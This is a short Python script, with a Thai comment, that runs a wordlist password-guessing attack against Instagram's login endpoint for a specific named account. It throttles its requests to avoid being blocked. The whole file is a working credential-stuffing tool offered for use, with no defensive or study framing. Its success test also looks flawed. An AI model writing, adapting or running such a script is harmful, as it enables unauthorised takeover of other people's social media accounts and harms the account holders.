import httpx
import time

USERNAME = "alx.trading"
WORDLIST = "passwords.txt"

def try_login(username, password):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest"
    }
    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{password}"
    }
    with httpx.Client(follow_redirects=True, timeout=10) as client:
        r = client.post(url, headers=headers, data=data)
        if "user" in r.text or r.status_code == 200:
            print(f"[SUCCESS] {password}")
            return True
        else:
            print(f"[FAIL] {password}")
            return False

with open(WORDLIST) as f:
    for line in f:
        pwd = line.strip()
        if try_login(USERNAME, pwd):
            print("Password found:", pwd)
            break
        time.sleep(1.5)  # จำกัด request/sec ไม่ให้โดนบล็อก